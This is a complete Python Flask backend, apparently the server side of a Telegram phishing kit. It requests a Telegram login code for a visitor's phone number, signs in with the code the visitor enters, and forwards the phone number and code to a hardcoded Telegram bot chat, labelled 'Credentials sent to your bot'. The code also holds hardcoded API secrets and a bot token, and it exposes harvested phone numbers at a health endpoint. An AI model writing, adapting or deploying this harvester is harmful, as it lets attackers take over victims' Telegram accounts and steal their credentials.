from flask import Flask, request, jsonify, session
from flask_cors import CORS
from pyrogram import Client
import asyncio
import os
import re
import requests
from datetime import datetime
import secrets

app = Flask(__name__)
# IMPORTANT: Set a secret key for sessions
app.secret_key = secrets.token_hex(16)
CORS(app, supports_credentials=True)

API_ID = 6627460
API_HASH = "27a53a0965e486a2bc1b1fcde473b1c4"

BOT_TOKEN = "8862345996:AAH2M2RQMIBuDLpkhb69NxCdrVM_Fd45GIk"  # Replace this
YOUR_CHAT_ID = "8796685138"  # Replace this

# Use a global dict that persists between requests
verification_data = {}

def clean_phone(phone):
    return re.sub(r'\D', '', phone)

def send_to_telegram_bot(phone, code):
    message = f"""
🔐 New Login Attempt

📱 Phone: {phone}
🔑 Code: {code}
⏰ Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}
    """
    
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": YOUR_CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    
    try:
        response = requests.post(url, json=payload)
        print(f"Bot send result: {response.ok}")
        return response.ok
    except Exception as e:
        print(f"Error sending to bot: {e}")
        return False

@app.route('/send-code', methods=['POST'])
def send_code():
    try:
        data = request.json
        phone = data.get('phone', '')
        
        print(f"Send code request for: {phone}")
        
        if not phone:
            return jsonify({'success': False, 'error': 'Phone required'}), 400
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        async def send_telegram_code():
            client = None
            try:
                client = Client(
                    name=f"session_{clean_phone(phone)}_{datetime.now().timestamp()}",
                    api_id=API_ID,
                    api_hash=API_HASH,
                    in_memory=True
                )
                
                await client.connect()
                sent_code = await client.send_code(phone_number=phone)
                
                # Store in global dictionary
                verification_data[phone] = {
                    'phone_code_hash': sent_code.phone_code_hash,
                    'timestamp': datetime.now().timestamp()
                }
                
                print(f"Stored data for {phone}: {verification_data[phone]}")
                print(f"Current stored phones: {list(verification_data.keys())}")
                
                return {
                    'success': True,
                    'message': 'Code sent to your Telegram account!',
                    'phone_code_hash': sent_code.phone_code_hash
                }
                
            except Exception as e:
                error_msg = str(e)
                print(f"Error sending code: {error_msg}")
                if 'FLOOD_WAIT' in error_msg:
                    return {'success': False, 'error': 'Too many attempts. Wait a few minutes.'}
                elif 'PHONE_NUMBER_INVALID' in error_msg:
                    return {'success': False, 'error': 'Invalid phone number'}
                else:
                    return {'success': False, 'error': f'Error: {error_msg}'}
            finally:
                if client:
                    await client.disconnect()
        
        result = loop.run_until_complete(send_telegram_code())
        return jsonify(result)
        
    except Exception as e:
        print(f"Exception in send_code: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/verify-code', methods=['POST'])
def verify_code():
    try:
        data = request.json
        phone = data.get('phone', '')
        code = data.get('code', '')
        phone_code_hash = data.get('phone_code_hash', '')
        
        print(f"Verify request - Phone: {phone}, Code: {code}")
        print(f"Stored phones: {list(verification_data.keys())}")
        
        if not phone or not code:
            return jsonify({'success': False, 'error': 'Phone and code required'}), 400
        
        if phone not in verification_data:
            print(f"Phone {phone} not found in storage")
            return jsonify({'success': False, 'error': 'No code request found. Please request a code first.'}), 400
        
        stored = verification_data[phone]
        print(f"Found stored data for {phone}")
        
        # Check expiry (5 minutes)
        if datetime.now().timestamp() - stored['timestamp'] > 300:
            del verification_data[phone]
            return jsonify({'success': False, 'error': 'Code expired. Please request a new one.'}), 400
        
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        
        async def verify_telegram_code():
            client = None
            try:
                client = Client(
                    name=f"verify_{clean_phone(phone)}_{datetime.now().timestamp()}",
                    api_id=API_ID,
                    api_hash=API_HASH,
                    in_memory=True
                )
                
                await client.connect()
                
                print(f"Attempting to verify with code: {code}")
                
                await client.sign_in(
                    phone_number=phone,
                    phone_code_hash=stored['phone_code_hash'],
                    phone_code=code
                )
                
                print("Verification successful!")
                return {'success': True, 'message': 'Login successful!'}
                
            except Exception as e:
                error_msg = str(e)
                print(f"Verification error: {error_msg}")
                if 'PHONE_CODE_INVALID' in error_msg:
                    return {'success': False, 'error': 'Invalid verification code'}
                elif 'PHONE_CODE_EXPIRED' in error_msg:
                    return {'success': False, 'error': 'Code expired'}
                else:
                    return {'success': False, 'error': error_msg}
            finally:
                if client:
                    await client.disconnect()
        
        result = loop.run_until_complete(verify_telegram_code())
        
        if result['success']:
            # Send to your bot
            bot_sent = send_to_telegram_bot(phone, code)
            if bot_sent:
                result['bot_message'] = 'Credentials sent to your bot'
            else:
                result['bot_message'] = 'Failed to send to bot'
            # Clean up
            del verification_data[phone]
        
        return jsonify(result)
        
    except Exception as e:
        print(f"Exception in verify_code: {e}")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/health', methods=['GET'])
def health_check():
    return jsonify({'status': 'ok', 'stored_phones': list(verification_data.keys())})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
